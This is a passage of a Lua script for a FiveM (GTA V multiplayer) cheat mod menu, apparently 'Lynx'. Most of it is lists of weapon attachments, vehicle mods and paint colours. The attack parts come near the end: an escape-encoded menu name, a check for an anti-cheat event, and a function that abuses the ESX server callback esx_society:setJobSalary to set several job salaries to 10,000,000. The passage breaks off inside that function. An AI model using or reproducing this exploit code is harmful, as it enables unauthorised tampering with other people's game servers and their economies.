				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_ADVANCEDRIFLE_CLIP_02"},
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_SMALL"},			
			},
			Flashlight = 
			{
				{ name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},		
		} },
		SpecialCarbine = { id = "weapon_specialcarbine", name="~h~~r~> ~s~Special Carbine", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_SPECIALCARBINE_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_SPECIALCARBINE_CLIP_02"},
				{ name = "~h~~r~> ~s~Drum Magazine", id="COMPONENT_SPECIALCARBINE_CLIP_03"},
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_MEDIUM"},			
			},
			Flashlight = 
			{
				{ name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		SpecialCarbineMkII = { id = "weapon_specialcarbine_mk2", name="~h~~r~> ~s~Special Carbine Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},
				{ name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},
				{ name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},
				{ name = "~h~~r~> ~s~Hollow Point Rounds", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},
				{ name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "~h~~r~> ~s~Small Scope", id="COMPONENT_AT_SCOPE_MACRO_MK2"},
				{ name = "~h~~r~> ~s~Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
			},
			Flashlight = 
			{
				{ name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{ name = "~h~~r~> ~s~Default", id="COMPONENT_AT_SC_BARREL_01"},	
				{ name = "~h~~r~> ~s~Heavy", id="COMPONENT_AT_SC_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
				{ name = "~h~~r~> ~s~Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "~h~~r~> ~s~Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "~h~~r~> ~s~Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "~h~~r~> ~s~Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "~h~~r~> ~s~Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "~h~~r~> ~s~Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
		
		} },
		BullpupRifle = { id = "weapon_bullpuprifle", name="~h~~r~> ~s~Bullpup Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_BULLPUPRIFLE_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_BULLPUPRIFLE_CLIP_02"},
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_SMALL"},			
			},
			Flashlight = 
			{
				{ name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		BullpupRifleMkII = { id = "weapon_bullpuprifle_mk2", name="~h~~r~> ~s~Bullpup Rifle Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},
				{ name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},
				{ name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},
				{ name = "~h~~r~> ~s~Armor Piercing Rounds", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},
				{ name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "~h~~r~> ~s~Small Scope", id="COMPONENT_AT_SCOPE_MACRO_02_MK2"},
				{ name = "~h~~r~> ~s~Medium Scope", id="COMPONENT_AT_SCOPE_SMALL_MK2"},
			},
			Flashlight = 
			{
				{ name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{ name = "~h~~r~> ~s~Default", id="COMPONENT_AT_BP_BARREL_01"},	
				{ name = "~h~~r~> ~s~Heavy", id="COMPONENT_AT_BP_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP"},
				{ name = "~h~~r~> ~s~Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "~h~~r~> ~s~Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "~h~~r~> ~s~Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "~h~~r~> ~s~Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "~h~~r~> ~s~Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "~h~~r~> ~s~Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		} },
		CompactRifle = { id = "weapon_compactrifle", name="~h~~r~> ~s~Compact Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_COMPACTRIFLE_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_COMPACTRIFLE_CLIP_02"},
				{ name = "~h~~r~> ~s~Drum Magazine", id="COMPONENT_COMPACTRIFLE_CLIP_03"},
			},
		} },	
	},
	LMG = {	
		MG = { id = "weapon_mg", name="~h~~r~> ~s~MG", bInfAmmo = false, mods = {					
			Magazines = 
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_MG_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_MG_CLIP_02"},
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_SMALL_02"},			
			},
		} },
		CombatMG = { id = "weapon_combatmg", name="~h~~r~> ~s~Combat MG", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_COMBATMG_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_COMBATMG_CLIP_02"},
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_MEDIUM"},			
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		} },
		CombatMGMkII = { id = "weapon_combatmg_mk2", name="~h~~r~> ~s~Combat MG Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_COMBATMG_MK2_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_COMBATMG_MK2_CLIP_02"},
				{ name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_COMBATMG_MK2_CLIP_TRACER"},
				{ name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},
				{ name = "~h~~r~> ~s~Hollow Point Rounds", id="COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},
				{ name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_COMBATMG_MK2_CLIP_FMJ"},		
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "~h~~r~> ~s~Medium Scope", id="COMPONENT_AT_SCOPE_SMALL_MK2"},
				{ name = "~h~~r~> ~s~Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
			},
			Barrel = 
			{
				{ name = "~h~~r~> ~s~Default", id="COMPONENT_AT_MG_BARREL_01"},	
				{ name = "~h~~r~> ~s~Heavy", id="COMPONENT_AT_MG_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "~h~~r~> ~s~Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "~h~~r~> ~s~Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "~h~~r~> ~s~Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "~h~~r~> ~s~Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "~h~~r~> ~s~Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "~h~~r~> ~s~Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
			
		
		} },
		GusenbergSweeper = { id = "weapon_gusenberg", name="~h~~r~> ~s~GusenbergSweeper", bInfAmmo = false, mods = {			
		Magazines = 
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_GUSENBERG_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_GUSENBERG_CLIP_02"},
			},
		} },
	},
	Snipers = {	
		SniperRifle = { id = "weapon_sniperrifle", name="~h~~r~> ~s~Sniper Rifle", bInfAmmo = false, mods = {
			Sights =
			{
				{ name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_LARGE"},	
				{ name = "~h~~r~> ~s~Advanced Scope", id="COMPONENT_AT_SCOPE_MAX"},			
			},
			BarrelAttachments = 
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP_02"},
			},
		
		} },
		HeavySniper = { id = "weapon_heavysniper", name="~h~~r~> ~s~Heavy Sniper", bInfAmmo = false, mods = {			
		Sights =
			{
				{ name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_LARGE"},	
				{ name = "~h~~r~> ~s~Advanced Scope", id="COMPONENT_AT_SCOPE_MAX"},			
			},
		} },
		HeavySniperMkII = { id = "weapon_heavysniper_mk2", name="~h~~r~> ~s~Heavy Sniper Mk II", bInfAmmo = false, mods = {
		Magazines =
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},
				{ name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},
				{ name = "~h~~r~> ~s~Armor Piercing Rounds", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},
				{ name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},		
				{ name = "~h~~r~> ~s~Explosive Rounds", id="COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"},
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Zoom Scope", id="COMPONENT_AT_SCOPE_LARGE_MK2"},
				{ name = "~h~~r~> ~s~Advanced Scope", id="COMPONENT_AT_SCOPE_MAX"},
				{ name = "~h~~r~> ~s~Nigt Vision Scope", id="COMPONENT_AT_SCOPE_NV"},
				{ name = "~h~~r~> ~s~Thermal Scope", id="COMPONENT_AT_SCOPE_THERMAL"},
			},	
			Barrel = 
			{
				{ name = "~h~~r~> ~s~Default", id="COMPONENT_AT_SR_BARREL_01"},	
				{ name = "~h~~r~> ~s~Heavy", id="COMPONENT_AT_SR_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_SR_SUPP_03"},
				{ name = "~h~~r~> ~s~Squared Muzzle Brake", id="COMPONENT_AT_MUZZLE_08"},
				{ name = "~h~~r~> ~s~Bell-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_09"},
			},
		} },
		MarksmanRifle = { id = "weapon_marksmanrifle", name="~h~~r~> ~s~Marksman Rifle", bInfAmmo = false, mods = {
			Magazines = 
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_MARKSMANRIFLE_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_MARKSMANRIFLE_CLIP_02"},
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Scope", id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"},			
			},
			Flashlight = 
			{
				{ name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},				
			},
			BarrelAttachments = 
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP"}			
			},
		
		
		} },
		MarksmanRifleMkII = { id = "weapon_marksmanrifle_mk2", name="~h~~r~> ~s~Marksman Rifle Mk II", bInfAmmo = false, mods = {
			Magazines =
			{
				{ name = "~h~~r~> ~s~Default Magazine", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},
				{ name = "~h~~r~> ~s~Extended Magazine", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},
				{ name = "~h~~r~> ~s~Tracer Rounds", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},
				{ name = "~h~~r~> ~s~Incendiary Rounds", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},
				{ name = "~h~~r~> ~s~Hollow Point Rounds", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},
				{ name = "~h~~r~> ~s~FMJ Rounds", id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"},		
			},
			Sights =
			{
				{ name = "~h~~r~> ~s~Holograhpic Sight", id="COMPONENT_AT_SIGHTS"},
				{ name = "~h~~r~> ~s~Large Scope", id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},
				{ name = "~h~~r~> ~s~Zoom Scope", id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"},
			},
			Flashlight = 
			{
				{ name = "~h~~r~> ~s~Flashlight", id="COMPONENT_AT_AR_FLSH"},			
			},			
			Barrel = 
			{
				{ name = "~h~~r~> ~s~Default", id="COMPONENT_AT_MRFL_BARREL_01"},	
				{ name = "~h~~r~> ~s~Heavy", id="COMPONENT_AT_MRFL_BARREL_02"},			
			},
			BarrelAttachments =
			{
				{ name = "~h~~r~> ~s~Suppressor", id="COMPONENT_AT_AR_SUPP"},
				{ name = "~h~~r~> ~s~Flat Muzzle Brake", id="COMPONENT_AT_MUZZLE_01"},
				{ name = "~h~~r~> ~s~Tactical Muzzle Brake", id="COMPONENT_AT_MUZZLE_02"},
				{ name = "~h~~r~> ~s~Fat-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_03"},
				{ name = "~h~~r~> ~s~Precision Muzzle Brake", id="COMPONENT_AT_MUZZLE_04"},
				{ name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id="COMPONENT_AT_MUZZLE_05"},
				{ name = "~h~~r~> ~s~Slanted Muzzle Brake", id="COMPONENT_AT_MUZZLE_06"},
				{ name = "~h~~r~> ~s~Split-End Muzzle Brake", id="COMPONENT_AT_MUZZLE_07"},
			},
			Grips =
			{
				{ name = "~h~~r~> ~s~Grip", id="COMPONENT_AT_AR_AFGRIP_02"}			
			},
		} },
	
	},
	Heavy = {
		RPG = { id = "weapon_rpg", name="~h~~r~> ~s~RPG", bInfAmmo = false, mods = {} },
		GrenadeLauncher = { id = "weapon_grenadelauncher", name="~h~~r~> ~s~Grenade Launcher", bInfAmmo = false, mods = {} },
		GrenadeLauncherSmoke = { id = "weapon_grenadelauncher_smoke", name="~h~~r~> ~s~Grenade Launcher Smoke", bInfAmmo = false, mods = {} },
		Minigun = { id = "weapon_minigun", name="~h~~r~> ~s~Minigun", bInfAmmo = false, mods = {} },
		FireworkLauncher = { id = "weapon_firework", name="~h~~r~> ~s~Firework Launcher", bInfAmmo = false, mods = {} },
		Railgun = { id = "weapon_railgun", name="~h~~r~> ~s~Railgun", bInfAmmo = false, mods = {} },
		HomingLauncher = { id = "weapon_hominglauncher", name="~h~~r~> ~s~Homing Launcher", bInfAmmo = false, mods = {} },
		CompactGrenadeLauncher = { id = "weapon_compactlauncher", name="~h~~r~> ~s~Compact Grenade Launcher", bInfAmmo = false, mods = {} },
		Widowmaker = { id = "weapon_rayminigun", name="~h~~r~> ~s~Widowmaker", bInfAmmo = false, mods = {} },
	
	},
	Throwables = {
		Grenade = { id = "weapon_grenade", name="~h~~r~> ~s~Grenade", bInfAmmo = false, mods = {} },
		BZGas = { id = "weapon_bzgas", name="~h~~r~> ~s~BZ Gas", bInfAmmo = false, mods = {} },
		MolotovCocktail = { id = "weapon_molotov", name="~h~~r~> ~s~Molotov Cocktail", bInfAmmo = false, mods = {} },
		StickyBomb = { id = "weapon_stickybomb", name="~h~~r~> ~s~Sticky Bomb", bInfAmmo = false, mods = {} },
		ProximityMines = { id = "weapon_proxmine", name="~h~~r~> ~s~Proximity Mines", bInfAmmo = false, mods = {} },
		Snowballs = { id = "weapon_snowball", name="~h~~r~> ~s~Snowballs", bInfAmmo = false, mods = {} },
		PipeBombs = { id = "weapon_pipebomb", name="~h~~r~> ~s~Pipe Bombs", bInfAmmo = false, mods = {} },
		Baseball = { id = "weapon_ball", name="~h~~r~> ~s~Baseball", bInfAmmo = false, mods = {} },
		TearGas = { id = "weapon_smokegrenade", name="~h~~r~> ~s~Tear Gas", bInfAmmo = false, mods = {} },
		Flare = { id = "weapon_flare", name="~h~~r~> ~s~Flare", bInfAmmo = false, mods = {} },
	
	},
	Misc = {	
		Parachute = { id = "gadget_parachute", name="~h~~r~> ~s~Parachute", bInfAmmo = false, mods = {} },
		FireExtinguisher = { id = "weapon_fireextinguisher", name="~h~~r~> ~s~Fire Extinguisher", bInfAmmo = false, mods = {} },	
	}
}

-- LS CUSTOMS LIST
local FirstJoinProper = false
local near = false
local closed = false
local insideGarage = false
local currentGarage = nil
local insidePosition = {}
local outsidePosition = {}
local oldrot = nil
local isPreviewing = false
local oldmod = -1
local oldmodtype = -1
local previewmod = -1
local oldmodaction = false
local vehicleMods = {
    {name = "~h~Spoilers", id = 0},
    {name = "~h~Front Bumper", id = 1},
    {name = "~h~Rear Bumper", id = 2},
    {name = "~h~Side Skirt", id = 3},
    {name = "~h~Exhaust", id = 4},
    {name = "~h~Frame", id = 5},
    {name = "~h~Grille", id = 6},
    {name = "~h~Hood", id = 7},
    {name = "~h~Fender", id = 8},
    {name = "~h~Right Fender", id = 9},
    {name = "~h~Roof", id = 10},
    {name = "~h~Vanity Plates", id = 25},
    {name = "~h~Trim", id = 27},
    {name = "~h~Ornaments", id = 28},
    {name = "~h~Dashboard", id = 29},
    {name = "~h~Dial", id = 30},
    {name = "~h~Door Speaker", id = 31},
    {name = "~h~Seats", id = 32},
    {name = "~h~Steering Wheel", id = 33},
    {name = "~h~Shifter Leavers", id = 34},
    {name = "~h~Plaques", id = 35},
    {name = "~h~Speakers", id = 36},
    {name = "~h~Trunk", id = 37},
    {name = "~h~Hydraulics", id = 38},
    {name = "~h~Engine Block", id = 39},
    {name = "~h~Air Filter", id = 40},
    {name = "~h~Struts", id = 41},
    {name = "~h~Arch Cover", id = 42},
    {name = "~h~Aerials", id = 43},
    {name = "~h~Trim 2", id = 44},
    {name = "~h~Tank", id = 45},
    {name = "~h~Windows", id = 46},
    {name = "~h~Livery", id = 48},
    {name = "~h~Wheels", id = 23},
    {name = "~h~Wheel Types", id = "wheeltypes"},
    {name = "~h~Extras", id = "extra"},
    {name = "~h~Neons", id = "neon"},
	{name = "~h~Paint", id = "paint"},
	{name = "~h~Headlights Color", id = "headlight"},
}
 
 
local perfMods = {
    {name = "~h~~r~Engine", id = 11},
    {name = "~h~~b~Brakes", id = 12},
    {name = "~h~~g~Transmission", id = 13},
    {name = "~h~~y~Suspension", id = 15},
}
 
 local headlightscolor = {
	 {name = "~h~Default", id = -1},
	 {name = "~h~White", id = 0},
	 {name = "~h~Blue", id = 1},
	 {name = "~h~Electric Blue", id = 2},
	 {name = "~h~Mint Green", id = 3},
	 {name = "~h~Lime Green", id = 4},
	 {name = "~h~Yellow", id = 5},
	 {name = "~h~Golden Shower", id = 6},
	 {name = "~h~Orange", id = 7},
	 {name = "~h~Red", id = 8},
	 {name = "~h~Pony Pink", id = 9},
	 {name = "~h~Hot Pink", id = 10},
	 {name = "~h~Purple", id = 11},
	 {name = "~h~Blacklight", id = 12},
 }
 
local neonColors = {
    ["White"] = {255,255,255},
    ["Blue"] ={0,0,255},
    ["Electric Blue"] ={0,150,255},
    ["Mint Green"] ={50,255,155},
    ["Lime Green"] ={0,255,0},
    ["Yellow"] ={255,255,0},
    ["Golden Shower"] ={204,204,0},
    ["Orange"] ={255,128,0},
    ["Red"] ={255,0,0},
    ["Pony Pink"] ={255,102,255},
    ["Hot Pink"] ={255,0,255},
    ["Purple"] ={153,0,153},
}
 
local paintsClassic = { -- kill me pls
    {name = "~h~Black", id = 0},
    {name = "~h~Carbon Black", id = 147},
    {name = "~h~Graphite", id = 1},
    {name = "~h~Anhracite Black", id = 11},
    {name = "~h~Black Steel", id = 2},
    {name = "~h~Dark Steel", id = 3},
    {name = "~h~Silver", id = 4},
    {name = "~h~Bluish Silver", id = 5},
    {name = "~h~Rolled Steel", id = 6},
    {name = "~h~Shadow Silver", id = 7},
    {name = "~h~Stone Silver", id = 8},
    {name = "~h~Midnight Silver", id = 9},
    {name = "~h~Cast Iron Silver", id = 10},
    {name = "~h~Red", id = 27},
    {name = "~h~Torino Red", id = 28},
    {name = "~h~Formula Red", id = 29},
    {name = "~h~Lava Red", id = 150},
    {name = "~h~Blaze Red", id = 30},
    {name = "~h~Grace Red", id = 31},
    {name = "~h~Garnet Red", id = 32},
    {name = "~h~Sunset Red", id = 33},
    {name = "~h~Cabernet Red", id = 34},
    {name = "~h~Wine Red", id = 143},
    {name = "~h~Candy Red", id = 35},
    {name = "~h~Hot Pink", id = 135},
    {name = "~h~Pfsiter Pink", id = 137},
    {name = "~h~Salmon Pink", id = 136},
    {name = "~h~Sunrise Orange", id = 36},
    {name = "~h~Orange", id = 38},
    {name = "~h~Bright Orange", id = 138},
    {name = "~h~Gold", id = 99},
    {name = "~h~Bronze", id = 90},
    {name = "~h~Yellow", id = 88},
    {name = "~h~Race Yellow", id = 89},
    {name = "~h~Dew Yellow", id = 91},
    {name = "~h~Dark Green", id = 49},
    {name = "~h~Racing Green", id = 50},
    {name = "~h~Sea Green", id = 51},
    {name = "~h~Olive Green", id = 52},
    {name = "~h~Bright Green", id = 53},
    {name = "~h~Gasoline Green", id = 54},
    {name = "~h~Lime Green", id = 92},
    {name = "~h~Midnight Blue", id = 141},
    {name = "~h~Galaxy Blue", id = 61},
    {name = "~h~Dark Blue", id = 62},
    {name = "~h~Saxon Blue", id = 63},
    {name = "~h~Blue", id = 64},
    {name = "~h~Mariner Blue", id = 65},
    {name = "~h~Harbor Blue", id = 66},
    {name = "~h~Diamond Blue", id = 67},
    {name = "~h~Surf Blue", id = 68},
    {name = "~h~Nautical Blue", id = 69},
    {name = "~h~Racing Blue", id = 73},
    {name = "~h~Ultra Blue", id = 70},
    {name = "~h~Light Blue", id = 74},
    {name = "~h~Chocolate Brown", id = 96},
    {name = "~h~Bison Brown", id = 101},
    {name = "~h~Creeen Brown", id = 95},
    {name = "~h~Feltzer Brown", id = 94},
    {name = "~h~Maple Brown", id = 97},
    {name = "~h~Beechwood Brown", id = 103},
    {name = "~h~Sienna Brown", id = 104},
    {name = "~h~Saddle Brown", id = 98},
    {name = "~h~Moss Brown", id = 100},
    {name = "~h~Woodbeech Brown", id = 102},
    {name = "~h~Straw Brown", id = 99},
    {name = "~h~Sandy Brown", id = 105},
    {name = "~h~Bleached Brown", id = 106},
    {name = "~h~Schafter Purple", id = 71},
    {name = "~h~Spinnaker Purple", id = 72},
    {name = "~h~Midnight Purple", id = 142},
    {name = "~h~Bright Purple", id = 145},
    {name = "~h~Cream", id = 107},
    {name = "~h~Ice White", id = 111},
    {name = "~h~Frost White", id = 112},
}
 
local lynxevo = "\126\117\126\76\121\110\120\32\126\115\126\79\102\102\105\99\105\97\108"
local paintsMatte = {
    {name = "~h~Black", id = 12},
    {name = "~h~Gray", id = 13},
    {name = "~h~Light Gray", id = 14},
    {name = "~h~Ice White", id = 131},
    {name = "~h~Blue", id = 83},
    {name = "~h~Dark Blue", id = 82},
    {name = "~h~Midnight Blue", id = 84},
    {name = "~h~Midnight Purple", id = 149},
    {name = "~h~Schafter Purple", id = 148},
    {name = "~h~Red", id = 39},
    {name = "~h~Dark Red", id = 40},
    {name = "~h~Orange", id = 41},
    {name = "~h~Yellow", id = 42},
    {name = "~h~Lime Green", id = 55},
    {name = "~h~Green", id = 128},
    {name = "~h~Forest Green", id = 151},
    {name = "~h~Foliage Green", id = 155},
    {name = "~h~Olive Darb", id = 152},
    {name = "~h~Dark Earth", id = 153},
    {name = "~h~Desert Tan", id = 154},
}
 
local paintsMetal = {
    {name = "~h~Brushed Steel", id = 117},
    {name = "~h~Brushed Black Steel", id = 118},
    {name = "~h~Brushed Aluminum", id = 119},
    {name = "~h~Pure Gold", id = 158},
    {name = "~h~Brushed Gold", id = 159},
}
 
defaultVehAction = ""
 
if GetVehiclePedIsUsing(PlayerPedId()) then
    veh = GetVehiclePedIsUsing(PlayerPedId())
end
-- END LS CUSTOMS LIST
local haharip = false
local Enabled = true

local meme = GetPlayerServerId(PlayerPedId(-1))
local memename = GetPlayerName(meme)
drawNotification("~h~Checking for Anti Lynx Protection", true)
TriggerServerEvent("antilynx8r4a:anticheat", meme, memename)

local function DrawTxt(text, x, y)
	SetTextFont(0)
	SetTextProportional(1)
	SetTextScale(0.0, 0.4)
	SetTextDropshadow(1, 0, 0, 0, 255)
	SetTextEdge(1, 0, 0, 0, 255)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

function RequestModelSync(mod)
    local model = GetHashKey(mod)
    RequestModel(model)
    while not HasModelLoaded(model) do
        RequestModel(model)
          Citizen.Wait(0)
    end
end

function EconomyDy2()
	if ESX then
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'police', 0, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'mecano', 0, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'ambulance', 0, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'realestateagent', 0, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'cardealer', 0, 10000000)

			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'police', 1, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'mecano', 1, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'ambulance', 1, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'realestateagent', 1, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'cardealer', 1, 10000000)

